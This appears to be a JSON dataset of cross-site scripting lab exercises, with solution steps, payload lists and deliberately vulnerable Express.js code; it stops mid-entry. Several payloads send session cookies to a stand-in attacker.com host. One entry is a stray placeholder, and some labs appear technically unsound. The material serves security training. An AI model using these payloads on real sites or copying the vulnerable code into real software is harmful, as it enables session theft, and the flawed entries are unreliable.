[
  {
    "Lab scenario": "Stored XSS in PDF Generator's Metadata",
    "Lab Description": "The application allows users to upload documents and generates downloadable PDFs. However, the PDF metadata fields (e.g., title, author) are not sanitized. The application directly embeds user input into the PDF metadata.\nTo solve: Inject a JavaScript payload into the metadata field and trigger execution upon opening the document in a web viewer.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite's Repeater to submit a modified document upload request containing JavaScript payload in the metadata.",
      "Inspect the generated PDF file to confirm payload retention.",
      "Inject <script>alert(document.domain)</script> into the 'Author' field.",
      "Download and open the PDF in a browser-based PDF viewer.",
      "Observe the alert box confirming the XSS execution."
    ],
    "payloads": [
      "<script>alert('PDF-XSS')</script>",
      "<img src=x onerror=alert('PDF Vulnerability')>",
      "<svg/onload=alert('PDF Attack')>",
      "<iframe src='javascript:alert(\\'PDF\\')'></iframe>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst multer = require('multer');\nconst fs = require('fs');\nconst pdfkit = require('pdfkit');\n\nconst app = express();\nconst upload = multer({ dest: 'uploads/' });\n\napp.post('/upload', upload.single('file'), (req, res) => {\n    const doc = new pdfkit();\n    const filePath = `uploads/${Date.now()}.pdf`;\n    doc.info.Title = req.body.title;\n    doc.info.Author = req.body.author;\n    doc.pipe(fs.createWriteStream(filePath));\n    doc.end();\n    res.send(`File saved: <a href='/${filePath}'>Download PDF</a>`);\n});\n\napp.listen(3000, () => console.log('Server running on port 3000'));"
  },
  {
    "Lab scenario": "DOM-based XSS in WebSocket Chat Application",
    "Lab Description": "A WebSocket-based chat application dynamically updates messages on the page using JavaScript innerHTML. User input is passed directly to the DOM without sanitization.\nTo solve: Inject a JavaScript payload into the chat input and trigger it upon rendering the received message.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use the browser console to establish a WebSocket connection.",
      "Send a malicious message payload: <img src=x onerror=alert(document.cookie)>",
      "Observe that the payload executes upon message rendering.",
      "Craft an obfuscated variation such as <svg/onload=alert(1)>.",
      "Confirm execution and exfiltration of user session cookies."
    ],
    "payloads": [
      "<img src=x onerror=alert(document.cookie)>",
      "<svg/onload=alert('Chat-XSS')>",
      "<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>",
      "<body onload=alert('Chat Vulnerability')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const WebSocket = require('ws');\nconst express = require('express');\nconst app = express();\nconst server = require('http').createServer(app);\nconst wss = new WebSocket.Server({ server });\n\napp.use(express.static('public'));\n\nwss.on('connection', ws => {\n    ws.on('message', message => {\n        wss.clients.forEach(client => {\n            if (client.readyState === WebSocket.OPEN) {\n                client.send(`<b>${message}</b>`);\n            }\n        });\n    });\n});\n\nserver.listen(3000, () => console.log('WebSocket server running on port 3000'));"
  },
  {
    "Lab scenario": "Reflected XSS via HTTP Header in Error Logging",
    "Lab Description": "An API exposes an error page that reflects user-controlled data from the 'Referer' header without encoding. Attackers can inject JavaScript payloads via crafted HTTP requests.\nTo solve: Inject a payload into the 'Referer' header and trigger execution on the error page.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Use Postman or Burp Suite to send a request with a modified 'Referer' header.",
      "Inject payload: <script>alert(document.domain)</script>.",
      "Observe the error page reflecting the payload.",
      "Modify the payload to use event-based execution: <img src=x onerror=alert(1)>.",
      "Confirm execution within the browser context."
    ],
    "payloads": [
      "<script>alert(document.domain)</script>",
      "<img src=x onerror=alert('Header Vulnerability')>",
      "<svg/onload=alert(document.domain)>",
      "<script>window.location='http://attacker.com/?cookie='+document.cookie</script>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/error', (req, res) => {\n    const referer = req.headers['referer'] || 'Unknown';\n    res.send(`<h2>Error: Access denied from ${referer}</h2>`);\n});\n\napp.listen(3000, () => console.log('Server running on port 3000'));"
  },
  {
    "Lab scenario": "Mutation-based XSS via Form Autofill",
    "Lab Description": "The web application includes an autofill mechanism that modifies DOM elements dynamically based on user input. However, it fails to properly sanitize input before updating the DOM, allowing attackers to execute malicious scripts.\nTo solve: Exploit the mutation event handler to trigger XSS upon autofill activation.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Inspect the form autofill mechanism in DevTools.",
      "Manually inject an event-based payload: <input onfocus=alert(1) autofocus>.",
      "Trigger the autofill process by navigating back to the form.",
      "Modify the attack to use a stealth payload: <svg onload=fetch('http://attacker.com')>.",
      "Confirm successful script execution and data exfiltration."
    ],
    "payloads": [
      "<input onfocus=alert(1) autofocus>",
      "<svg onload=alert('Autofill-XSS')>",
      "<script>alert('Autofill Attack')</script>",
      "<div contenteditable onfocus=alert('Mutation XSS')>Test</div>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/', (req, res) => {\n    res.send(`\n    <form>\n      <input type=\"text\" id=\"username\" placeholder=\"Enter username\">\n      <button type=\"submit\">Submit</button>\n    </form>\n    <script>\n      document.getElementById('username').oninput = function() {\n        document.getElementById('username').setAttribute('value', this.value);\n      };\n    </script>\n    `);\n});\n\napp.listen(3000, () => console.log('Server running on port 3000'));"
  },
  {
    "Lab scenario": "Reflected XSS in JSONP Callback Parameter",
    "Lab Description": "An API endpoint provides JSONP responses and accepts a user-supplied callback parameter without proper sanitization. This vulnerability allows an attacker to inject malicious JavaScript code that is executed in the context of the victim's browser when the response is loaded.\nTo solve: Craft a request with a malicious callback value that triggers script execution upon the JSONP response being processed by the browser.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Send a GET request to the vulnerable endpoint using Postman or a web browser.",
      "Set the callback parameter to a payload such as <script>alert('XSS')</script>.",
      "Observe the JSONP response reflecting the unsanitized callback parameter.",
      "Modify the payload to an obfuscated variant, e.g., <img src=x onerror=alert(1)> if necessary.",
      "Confirm that the payload executes when the response is processed in the browser."
    ],
    "payloads": [
      "<script>alert('JSONP-XSS')</script>",
      "<img src=x onerror=alert(1)>",
      "<svg/onload=alert('JSONP Vulnerability')>",
      "<script>document.write('<img src=x onerror=alert(\\\"JSONP\\\")>')</script>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\n\n// Vulnerable JSONP endpoint\napp.get('/data', (req, res) => {\n  const callback = req.query.callback || 'callback';\n  // Vulnerable: directly injecting the user-supplied callback into the response\n  const data = { message: 'Hello, World!' };\n  res.type('text/javascript');\n  res.send(`${callback}(${JSON.stringify(data)});`);\n});\n\napp.listen(3000, () => console.log('JSONP server running on port 3000'));\n"
  },
  {
    "Lab scenario": "Stored XSS in Comment System with Emoji Rendering",
    "Lab Description": "The application's comment system supports emoji rendering, but fails to properly sanitize user input before processing. Attackers can inject JavaScript payloads disguised as emoji text.\nTo solve: Inject a payload inside a comment and trigger execution upon rendering.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept a comment submission request.",
      "Inject payload disguised as an emoji: \u00f0\u0178\u02dc\u0160<script>alert(document.cookie)</script>.",
      "Submit the comment and reload the page.",
      "Observe the XSS execution when the comment is displayed.",
      "Confirm session hijacking by stealing cookies."
    ],
    "payloads": [
      "\u00f0\u0178\u02dc\u0160<script>alert(document.cookie)</script>",
      "\u00f0\u0178\u02dc\u0160<img src=x onerror=alert('Comment XSS')>",
      "\u00f0\u0178\u02dc\u0160<svg/onload=alert('Emoji XSS')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet comments = [];\napp.use(bodyParser.urlencoded({ extended: true }));\napp.get('/', (req, res) => {\n    res.send(`<form action='/comment' method='POST'>\n      <input type='text' name='comment' placeholder='Enter comment'>\n      <button type='submit'>Post</button>\n    </form>\n    <div>${comments.join('<br>')}</div>`);\n});\napp.post('/comment', (req, res) => {\n    comments.push(req.body.comment);\n    res.redirect('/');\n});\napp.listen(3000, () => console.log('Server running on port 3000'));"
  },
  {
    "Lab scenario": "Reflected XSS in JSON API Response",
    "Lab Description": "The API returns user-provided input directly in a JSON response without encoding. JavaScript code injected into the 'message' parameter executes when viewed in certain browsers.\nTo solve: Inject a JavaScript payload into the 'message' parameter and trigger execution.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Use Postman to send a request to /api/message?text=<script>alert(1)</script>.",
      "Observe the response reflecting the payload.",
      "Access the API response via a vulnerable browser context (e.g., an embedded iframe).",
      "Modify payload for obfuscation: \"><script>alert('XSS')</script>.",
      "Confirm successful execution within the browser."
    ],
    "payloads": [
      "<script>alert(1)</script>",
      "\"><script>alert('XSS')</script>",
      "<img src=x onerror=alert('JSON API XSS')>",
      "<svg/onload=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/api/message', (req, res) => {\n    res.json({ message: req.query.text });\n});\n\napp.listen(3000, () => console.log('Server running on port 3000'));"
  },
  {
    "Lab scenario": "Stored XSS in GraphQL Query Response",
    "Lab Description": "A GraphQL API endpoint echoes user-controlled input in responses without sanitization. Attackers can inject malicious JavaScript that executes when another user queries the API.\nTo solve: Inject an XSS payload in a stored query field and retrieve it through another API call.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use GraphQL Playground to send a mutation request storing JavaScript in a query field.",
      "Inject: mutation { saveComment(text: \"<script>alert(1)</script>\") }.",
      "Send a GraphQL query to retrieve the stored comment.",
      "Observe XSS execution when the response is rendered in a web interface.",
      "Modify payload for stealth execution: <svg/onload=alert(1)>."
    ],
    "payloads": [
      "<script>alert(1)</script>",
      "<svg/onload=alert('GraphQL XSS')>",
      "<img src=x onerror=alert('Stored GraphQL XSS')>",
      "<script>document.write('<img src=x onerror=alert(\\'XSS\\')>')</script>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst { graphqlHTTP } = require('express-graphql');\nconst { buildSchema } = require('graphql');\n\nconst schema = buildSchema(`\n  type Query { comments: [String] }\n  type Mutation { saveComment(text: String!): String }\n`);\n\nlet comments = [];\nconst root = {\n    comments: () => comments,\n    saveComment: ({ text }) => {\n        comments.push(text);\n        return 'Comment saved';\n    }\n};\n\nconst app = express();\napp.use('/graphql', graphqlHTTP({ schema, rootValue: root, graphiql: true }));\napp.listen(3000, () => console.log('GraphQL server running on port 3000'));"
  },
  {
    "Lab scenario": "Mutation-based XSS in Event Listener",
    "Lab Description": "The application listens for user input events and updates the DOM dynamically. Malicious input can modify the event handler to execute arbitrary JavaScript.\nTo solve: Inject an XSS payload using an unexpected mutation event and trigger execution.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Inspect the page's JavaScript event listeners using DevTools.",
      "Identify an input field that triggers a mutation event.",
      "Inject payload into an input field: <input onfocus=alert(1) autofocus>.",
      "Navigate back to the input field to trigger the event.",
      "Observe XSS execution within the browser context."
    ],
    "payloads": [
      "<input onfocus=alert(1) autofocus>",
      "<svg onload=alert('Event XSS')>",
      "<script>alert('Mutation XSS')</script>",
      "<div contenteditable onfocus=alert('XSS via Mutation')>Edit me</div>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\napp.get('/', (req, res) => {\n    res.send(`\n    <form>\n      <input type='text' id='user_input' placeholder='Type something'>\n      <button type='submit'>Submit</button>\n    </form>\n    <script>\n      document.getElementById('user_input').addEventListener('input', function() {\n        document.getElementById('user_input').setAttribute('value', this.value);\n      });\n    </script>\n    `);\n});\napp.listen(3000, () => console.log('Server running on port 3000'));"
  },
  {
    "i need to generate lab here": "here"
  },
  {
    "Lab scenario": "Stored XSS in WebSocket Chat Application",
    "Lab Description": "A WebSocket-based chat application broadcasts user messages without proper sanitization, allowing stored XSS. The application directly inserts unsanitized messages into the DOM of connected clients.\nTo solve: Inject a JavaScript payload into a chat message and trigger execution on another client.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept a WebSocket message using Burp Suite to observe its structure.",
      "Inject a payload such as <script>alert('XSS')</script> into the chat message.",
      "Send the modified message through the WebSocket connection.",
      "Observe the payload execution on another connected client.",
      "Refine the payload using obfuscation (e.g., <img src=x onerror=alert(1)>) to bypass simple filters."
    ],
    "payloads": [
      "<script>alert('Chat XSS')</script>",
      "<img src=x onerror=alert('Chat XSS')>",
      "<svg/onload=alert('Chat Vulnerability')>",
      "<iframe src='javascript:alert(\"Chat XSS\")'></iframe>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst http = require('http');\nconst WebSocket = require('ws');\nconst app = express();\nconst server = http.createServer(app);\nconst wss = new WebSocket.Server({ server });\n\nwss.on('connection', ws => {\n    ws.on('message', message => {\n        // Vulnerable: directly broadcasting unsanitized message\n        wss.clients.forEach(client => {\n            if (client.readyState === WebSocket.OPEN) {\n                client.send(message);\n            }\n        });\n    });\n});\n\nserver.listen(3000, () => console.log('WebSocket server running on port 3000'));"
  },
  {
    "Lab scenario": "DOM-based XSS via window.name Property",
    "Lab Description": "This lab demonstrates a DOM-based XSS vulnerability where the application reads the window.name property and injects its value into the HTML without sanitization.\nTo solve: Modify window.name with a JavaScript payload and trigger its execution on page load.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Open a new browser tab and set window.name to a payload, e.g., '<script>alert(\"XSS\")</script>'.",
      "Navigate to the vulnerable page that reads window.name.",
      "Observe the unsanitized insertion of window.name into the DOM.",
      "Test an obfuscated payload such as '<img src=x onerror=alert(1)>' to bypass filters.",
      "Confirm the payload execution upon page load."
    ],
    "payloads": [
      "<script>alert(\"window.name XSS\")</script>",
      "<img src=x onerror=alert('window.name vulnerability')>",
      "<svg/onload=alert('window.name')>",
      "<object data=\"javascript:alert('window.name')\"></object>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/', (req, res) => {\n  res.send(`\n    <html>\n      <body>\n        <script>\n          // Vulnerable: directly injecting window.name into the page\n          if(window.name) {\n            document.body.innerHTML += window.name;\n          }\n        </script>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000, () => console.log('Server running on port 3000'));\n"
  },
  {
    "Lab scenario": "Mutation-Based XSS in Content Editable Element",
    "Lab Description": "The application provides a contenteditable div for user input without proper sanitization, allowing an attacker to inject malicious scripts. The vulnerability lies in the dynamic mutation of the DOM based on user input.\nTo solve: Inject a JavaScript payload into the contenteditable area and trigger its execution upon re-rendering.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Locate the contenteditable div using browser DevTools.",
      "Inject a payload such as <div contenteditable='true'><script>alert('XSS')</script></div>.",
      "Submit the form to save the content.",
      "Reload the page to see the unsanitized content being rendered.",
      "Refine the payload to bypass potential filters, e.g., using an SVG onload event."
    ],
    "payloads": [
      "<script>alert('Editable XSS')</script>",
      "<img src=x onerror=alert('Editable XSS')>",
      "<svg/onload=alert('Editable Vulnerability')>",
      "<div contenteditable oninput=alert('ContentEditable XSS')>Edit me</div>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet storedContent = '';\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/', (req, res) => {\n  res.send(`\n    <html>\n      <body>\n        <form action='/save' method='POST'>\n          <div contenteditable='true' id='editable' name='content'>${storedContent}</div>\n          <button type='submit'>Save</button>\n        </form>\n        <script>\n          // Vulnerable: client-side code that saves unsanitized input\n          document.getElementById('editable').addEventListener('input', function() {\n            this.setAttribute('value', this.innerHTML);\n          });\n        </script>\n      </body>\n    </html>\n  `);\n});\n\napp.post('/save', (req, res) => {\n  storedContent = req.body.content;\n  res.redirect('/');\n});\n\napp.listen(3000, () => console.log('Server running on port 3000'));\n"
  },
  {
    "Lab scenario": "Reflected XSS in HTTP Response Header",
    "Lab Description": "This lab targets a vulnerability where the application reflects data from a custom HTTP header into the response header without sanitization. Attackers can inject malicious scripts that execute in the browser.\nTo solve: Inject an XSS payload in a custom header and observe its execution when the response header is processed.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Intercept an HTTP request using Burp Suite or Postman.",
      "Modify a custom header (e.g., X-Custom) to include the payload: <script>alert('XSS')</script>.",
      "Send the request and review the HTTP response headers.",
      "Craft a payload variant (e.g., <img src=x onerror=alert(1)>) to bypass basic filters.",
      "Confirm that the injected script executes in the browser context."
    ],
    "payloads": [
      "<script>alert('Header XSS')</script>",
      "<img src=x onerror=alert('Header Vulnerability')>",
      "<svg/onload=alert('Header')>",
      "<script>window.location='http://attacker.com/?cookie='+document.cookie</script>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/', (req, res) => {\n  // Vulnerable: reflecting the custom header into the response header\n  const injectedHeader = req.headers['x-custom'] || 'No header provided';\n  res.setHeader('X-Injected', injectedHeader);\n  res.send('Check your browser console or header inspector.');\n});\n\napp.listen(3000, () => console.log('Server running on port 3000'));\n"
  },
  {
    "Lab scenario": "Stored XSS in GraphQL Comment Field",
    "Lab Description": "A GraphQL API endpoint accepts and stores user comments without proper sanitization. When these comments are later rendered on a web page, the unsanitized content triggers an XSS attack.\nTo solve: Inject a JavaScript payload via a GraphQL mutation and trigger its execution during comment retrieval.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Access the GraphQL Playground to interact with the API.",
      "Send a mutation to add a comment: mutation { addComment(comment: \"<script>alert('XSS')</script>\") }.",
      "Execute a query to retrieve stored comments.",
      "Observe that the unsanitized comment executes in the client browser.",
      "Refine the payload to bypass filters, for example, using an SVG onload event."
    ],
    "payloads": [
      "<script>alert('GraphQL XSS')</script>",
      "<img src=x onerror=alert('GraphQL Vulnerability')>",
      "<svg/onload=alert('GraphQL XSS')>",
      "<script>document.write('<img src=x onerror=alert(\"GraphQL XSS\")>')</script>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst { graphqlHTTP } = require('express-graphql');\nconst { buildSchema } = require('graphql');\n\nconst schema = buildSchema(`\n  type Query { comments: [String] }\n  type Mutation { addComment(comment: String!): String }\n`);\n\nlet comments = [];\n\nconst root = {\n  comments: () => comments,\n  addComment: ({ comment }) => {\n    // Vulnerable: storing unsanitized comment\n    comments.push(comment);\n    return 'Comment saved';\n  }\n};\n\nconst app = express();\napp.use('/graphql', graphqlHTTP({\n  schema: schema,\n  rootValue: root,\n  graphiql: true\n}));\n\napp.listen(3000, () => console.log('GraphQL API running on port 3000'));\n"
  },
  {
    "Lab scenario": "Stored XSS in Notification Panel",
    "Lab Description": "The application maintains a notification panel where server-stored messages are rendered on the client without proper sanitization. Attackers can inject JavaScript payloads into notification messages that persist and execute when viewed.\nTo solve: Inject a payload into the notification submission and trigger its execution when the panel reloads.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept a notification submission using Burp Suite and modify the payload.",
      "Inject a script payload such as <script>alert('XSS')</script> into the notification message.",
      "Submit the modified notification to store it on the server.",
      "Refresh the notification panel and observe the payload execution.",
      "Refine the payload using an obfuscated variant (e.g., <img src=x onerror=alert(1)>) to bypass filters."
    ],
    "payloads": [
      "<script>alert('Notification XSS')</script>",
      "<img src=x onerror=alert('Notification XSS')>",
      "<svg/onload=alert('Notification XSS')>",
      "<iframe src='javascript:alert(\"Notification XSS\")'></iframe>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet notifications = [];\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/', (req, res) => {\n  let notifHTML = notifications.map(n => `<div>${n}</div>`).join('');\n  res.send(`\n    <html>\n      <body>\n        <h2>Notifications</h2>\n        ${notifHTML}\n        <form action='/notify' method='POST'>\n          <input type='text' name='message' placeholder='Enter notification'>\n          <button type='submit'>Send</button>\n        </form>\n      </body>\n    </html>\n  `);\n});\n\napp.post('/notify', (req, res) => {\n  // Vulnerable: unsanitized input is stored and rendered\n  notifications.push(req.body.message);\n  res.redirect('/');\n});\n\napp.listen(3000, () => console.log('Server running on port 3000'));\n"
  },
  {
    "Lab scenario": "DOM-based XSS in GraphQL Subscription Display",
    "Lab Description": "This lab involves a GraphQL subscription that delivers real-time updates to a client-side dashboard. The subscription data is inserted into the DOM without proper encoding, allowing an attacker to deliver a malicious payload via the subscription stream.\nTo solve: Inject a payload through the subscription endpoint and trigger it when the client renders the data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Connect to the GraphQL subscription endpoint via GraphQL Playground or a custom client.",
      "Send a subscription message containing a payload like <script>alert('XSS')</script>.",
      "Observe the client-side dashboard receiving and inserting the payload into the DOM.",
      "Alter the payload to bypass basic filters (e.g., using <svg/onload=alert(1)>).",
      "Confirm the script execution upon message rendering in the client."
    ],
    "payloads": [
      "<script>alert('GraphQL Subscription XSS')</script>",
      "<img src=x onerror=alert('GraphQL Subscription XSS')>",
      "<svg/onload=alert('GraphQL Subscription XSS')>",
      "<object data=\"javascript:alert('GraphQL Subscription XSS')\"></object>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst { graphqlHTTP } = require('express-graphql');\nconst { buildSchema } = require('graphql');\nconst http = require('http');\nconst WebSocket = require('ws');\n\n// Simple GraphQL schema with subscription simulation\nconst schema = buildSchema(`\n  type Query { info: String }\n  type Mutation { sendUpdate(message: String!): String }\n`);\n\nlet currentMessage = '';\nconst root = {\n  info: () => currentMessage,\n  sendUpdate: ({ message }) => {\n    // Vulnerable: storing unsanitized subscription message\n    currentMessage = message;\n    return 'Update sent';\n  }\n};\n\nconst app = express();\napp.use('/graphql', graphqlHTTP({\n  schema,\n  rootValue: root,\n  graphiql: true\n}));\n\nconst server = http.createServer(app);\nconst wss = new WebSocket.Server({ server });\n\n// Simulate pushing subscription updates to all clients\nsetInterval(() => {\n  wss.clients.forEach(client => {\n    if (client.readyState === WebSocket.OPEN) {\n      client.send(currentMessage);\n    }\n  });\n}, 5000);\n\nserver.listen(3000, () => console.log('GraphQL subscription server running on port 3000'));\n"
  },
  {
    "Lab scenario": "Reflected XSS in URL Fragment Parsing",
    "Lab Description": "The client-side script extracts the URL fragment (window.location.hash) and injects it into the DOM without proper sanitization. An attacker can craft a URL with a malicious hash that executes arbitrary JavaScript when the page loads.\nTo solve: Modify the URL fragment to include a payload and trigger its execution in the browser.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Open the vulnerable page in a browser.",
      "Append a malicious payload to the URL hash, e.g., #<script>alert('XSS')</script>.",
      "Reload the page to let the client-side script process the hash.",
      "Observe that the unsanitized hash is inserted into the DOM and executes.",
      "Test with an obfuscated payload (e.g., using <img src=x onerror=alert(1)>) to bypass simple filters."
    ],
    "payloads": [
      "<script>alert('URL Fragment XSS')</script>",
      "<img src=x onerror=alert('URL Fragment XSS')>",
      "<svg/onload=alert('URL Fragment XSS')>",
      "<body onload=alert('URL Fragment XSS')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/', (req, res) => {\n  res.send(`\n    <html>\n      <body>\n        <h2>Welcome</h2>\n        <div id='content'></div>\n        <script>\n          // Vulnerable: directly using window.location.hash without sanitization\n          var hash = window.location.hash.substring(1);\n          if(hash) {\n            document.getElementById('content').innerHTML = hash;\n          }\n        </script>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000, () => console.log('Server running on port 3000'));\n"
  },
  {
    "Lab scenario": "Stored XSS in User Profile Update Section",
    "Lab Description": "Users can update their profile information, including a bio, which is stored on the server and rendered on their profile page. Lack of sanitization allows malicious scripts to persist and execute in the profile view.\nTo solve: Inject a JavaScript payload in the bio update and verify execution when the profile is loaded.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit a profile update using Postman or the web interface with a payload like <script>alert('XSS')</script> in the bio field.",
      "Ensure the updated bio is stored on the server.",
      "Navigate to the profile page to view the stored bio.",
      "Observe that the payload executes in the user\u00e2\u20ac\u2122s browser.",
      "Refine the payload (e.g., <svg/onload=alert(1)>) to bypass simple input filters."
    ],
    "payloads": [
      "<script>alert('Profile XSS')</script>",
      "<img src=x onerror=alert('Profile XSS')>",
      "<svg/onload=alert('Profile XSS')>",
      "<iframe src='javascript:alert(\"Profile XSS\")'></iframe>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet userProfile = { bio: 'Default bio' };\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/profile', (req, res) => {\n  // Vulnerable: unsanitized user bio is rendered\n  res.send(`\n    <html>\n      <body>\n        <h2>User Profile</h2>\n        <div>${userProfile.bio}</div>\n        <form action='/update' method='POST'>\n          <input type='text' name='bio' placeholder='Update bio'>\n          <button type='submit'>Update</button>\n        </form>\n      </body>\n    </html>\n  `);\n});\n\napp.post('/update', (req, res) => {\n  userProfile.bio = req.body.bio;\n  res.redirect('/profile');\n});\n\napp.listen(3000, () => console.log('Server running on port 3000'));\n"
  },
  {
    "Lab scenario": "Mutation-based XSS via Drag-and-Drop File Upload",
    "Lab Description": "The application supports drag-and-drop file uploads and displays file metadata in a preview panel. The preview code unsafely uses innerHTML to render metadata, allowing mutation-based XSS when an attacker uploads a file with a maliciously crafted metadata field.\nTo solve: Modify the file metadata to include a payload and trigger its execution when the preview is rendered.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Simulate a file upload by sending a request with JSON file metadata using Postman or Burp Suite.",
      "Inject a payload such as <script>alert('XSS')</script> in the metadata field (e.g., file description).",
      "Upload the file and observe the preview panel rendering the metadata.",
      "Notice the unsanitized insertion of the payload causing script execution.",
      "Test a refined payload (e.g., <img src=x onerror=alert(1)>) to bypass basic sanitization."
    ],
    "payloads": [
      "<script>alert('File Upload XSS')</script>",
      "<img src=x onerror=alert('File Upload XSS')>",
      "<svg/onload=alert('File Upload XSS')>",
      "<object data=\"javascript:alert('File Upload XSS')\"></object>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.json());\n\nlet filePreviews = [];\n\n// Endpoint to handle simulated file uploads with metadata\napp.post('/upload', (req, res) => {\n  // Vulnerable: storing unsanitized file metadata\n  filePreviews.push(req.body.metadata);\n  res.send('File uploaded');\n});\n\napp.get('/preview', (req, res) => {\n  let previewHTML = filePreviews.map(meta => `<div>${meta}</div>`).join('');\n  res.send(`\n    <html>\n      <body>\n        <h2>File Previews</h2>\n        ${previewHTML}\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000, () => console.log('Server running on port 3000'));\n"
  },
  {
    "Lab scenario": "DOM-based XSS via Local Storage Injection",
    "Lab Description": "The application saves user preferences in the browser's localStorage and later reads them to personalize the UI. However, it fails to sanitize the stored values before inserting them into the DOM, allowing attackers to inject malicious scripts.\nTo solve: Inject a JavaScript payload into localStorage using browser DevTools and trigger its execution when the page loads.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Open the browser console and set a malicious value in localStorage, e.g., localStorage.setItem('prefs', '<script>alert(1)</script>').",
      "Reload the page to trigger the unsanitized insertion of the localStorage value into the DOM.",
      "Observe the execution of the injected payload.",
      "Test a bypass variant using an obfuscated payload, e.g., '<img src=x onerror=alert(1)>' stored instead.",
      "Confirm the successful script execution upon page reload."
    ],
    "payloads": [
      "<script>alert('LocalStorage XSS')</script>",
      "<img src=x onerror=alert('LocalStorage XSS')>",
      "<svg/onload=alert('LocalStorage XSS')>",
      "<iframe src='javascript:alert(\"LocalStorage XSS\")'></iframe>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/', (req, res) => {\n  res.send(`\n    <html>\n      <head>\n        <title>Preference Loader</title>\n      </head>\n      <body>\n        <h2>Welcome Back!</h2>\n        <div id='userPrefs'></div>\n        <script>\n          // Vulnerable: directly using localStorage content without sanitization\n          var prefs = localStorage.getItem('prefs');\n          if(prefs) {\n            document.getElementById('userPrefs').innerHTML = prefs;\n          }\n        </script>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000, () => console.log('Server running on port 3000'));\n"
  },
  {
    "Lab scenario": "Reflected XSS in REST API Error Message",
    "Lab Description": "An API endpoint designed to handle user requests returns error messages containing the unsanitized user input. An attacker can supply a malicious value that gets reflected in the error message, leading to XSS when the error is displayed in the browser.\nTo solve: Craft a request with a payload in the input parameter and trigger the reflected error message.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Use Postman or Burp Suite to send a request with an invalid parameter value including a payload, e.g., <script>alert('XSS')</script>.",
      "Observe the error message reflecting the payload in the API response.",
      "Modify the payload to bypass simple filters, e.g., using <img src=x onerror=alert(1)>.",
      "Reload the request and inspect the response in a vulnerable browser context.",
      "Confirm execution of the injected script from the error message."
    ],
    "payloads": [
      "<script>alert('REST API XSS')</script>",
      "<img src=x onerror=alert('REST API XSS')>",
      "<svg/onload=alert('REST API XSS')>",
      "<body onload=alert('REST API XSS')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/api/data', (req, res) => {\n  const userInput = req.query.input || '';\n  // Vulnerable: reflecting user input in error message without sanitization\n  if (!userInput.match(/^[a-zA-Z0-9]+$/)) {\n    return res.status(400).send(`Error: Invalid input: ${userInput}`);\n  }\n  res.send('Valid input received');\n});\n\napp.listen(3000, () => console.log('Server running on port 3000'));\n"
  },
  {
    "Lab scenario": "Stored XSS in Online Forum Post",
